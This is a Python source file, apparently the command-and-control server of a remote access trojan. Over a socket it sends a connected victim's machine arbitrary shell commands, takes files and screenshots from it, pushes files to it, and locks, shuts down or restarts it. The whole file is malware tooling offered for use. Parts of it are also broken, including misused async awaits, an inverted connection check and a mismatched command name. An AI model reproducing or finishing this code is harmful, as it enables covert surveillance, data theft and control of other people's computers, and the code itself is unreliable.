from multiprocessing import connection
import socket, json, base64

# Set the commands as a 2D array with descriptions for modularity
commands = [
    ["exit", "Exits the connection on both sides"],
    ["cd", "Changes the active directory"],
    ["download", "Downloads files from the client"],
    ["upload", "Uploads files from the server to the client"],
    ["message", "Shows a message box on the client users screen"],
    ["lock", "Puts the client user back to the login screen"],
    ["shutdown", "Shutsdown the client users PC, will close connection"],
    ["restart", "Restarts the client users PC"],
    ["ratHelp", "Displays this list"],
    ["screen", "makes screenshot"],
]

def helpCommand():
    total = 0
    result = "\nCommands: \n"
    # Simple loop to send a description of all commands
    for x in commands:
        result = result + "\n" + f"[{total}] {commands[total][0]} - {commands[total][1]}"
        total += 1
    result = result + "\n" + "[∞] Anything - will run a command on the users PC like command prompt\n"
    return result

class ManyServers:
    def __init__(self):
        import config
        self.servers = {}
        server = Server(config.SERVER_IP, config.SERVER_PORT)
        self.servers.update({server.tag: server})
    
    async def add_connection(self):
        import config
        server = Server(config.SERVER_IP, config.SERVER_PORT)
        self.servers.update({server.tag: server})
        self.add_connection()
    
    async def view_all_servers(self):
        s = ""
        for i in self.servers.keys:
            s = s + i + "\n"
        await s
    
    async def make_command_to_server(self, command):
        tag = command.split()[0]
        if not self.servers.get(tag, "no") == "no":
            await f"exist not connection with name: {tag}"
        elif self.servers[tag].in_process:
            await f"{tag} connection already in process"
        else:
            # @todo all
            command = command.split()[1]
            res = self.servers[tag].step(command)
            await res


class Server:
    def __init__(self, ip, port):
        self.in_procces = False
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = server.accept()
        self.tag = address
        print("[+] Connection received from " + str(address))
        helpCommand()

    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def dataSend(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    def executeRemotely(self, command):
        self.send_json(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.receive_json()

    def readFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def writeFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"
    
    def screenshot(self, content):
        with open("screen.png", "wb") as file:
            file.write(base64.b64decode(content))
        return ("[+] screen complete",)
    
    # Отправка json-данных клиенту
    def send_json(self, data):     
        # Обрабатываем бинарные данные
        try: json_data = json.dumps(data.decode('utf-8'))
        except: json_data = json.dumps(data)
        
        # В случае если клиент разорвал соединение но сервер отправляет команду
        try:
            self.connection.send(json_data.encode('utf-8')) 
        except ConnectionResetError:
            # Отключаемся от текущей сессии
            self.connection = None


    # Получаем json данные от клиента
    def receive_json(self):
        json_data = ''
        while True:
            try:
                if self.connection != None:
                    json_data += self.connection.recv(1024).decode('utf-8')
                    return json.loads(json_data)
                else: 
                    return None
            except ValueError:
                pass
        
    def step(self, command):
        command = command.split(" ", 1)
        try:
            if command[0] == "upload":
                fileContent = self.readFile(command[1]).decode()
                command.append(fileContent)
            result = self.executeRemotely(command)
            if command[0] == "download" and "[-] Error" not in result:
                result = self.writeFile(command[1], result)
            if command[0] == "screenshot" and "[-] Error" not in result:
                result = self.screenshot(result)
            elif command[0] == "ratHelp":
                result = helpCommand()
        except Exception:
            result = "[-] Error running command, check the syntax of the command."
        return result
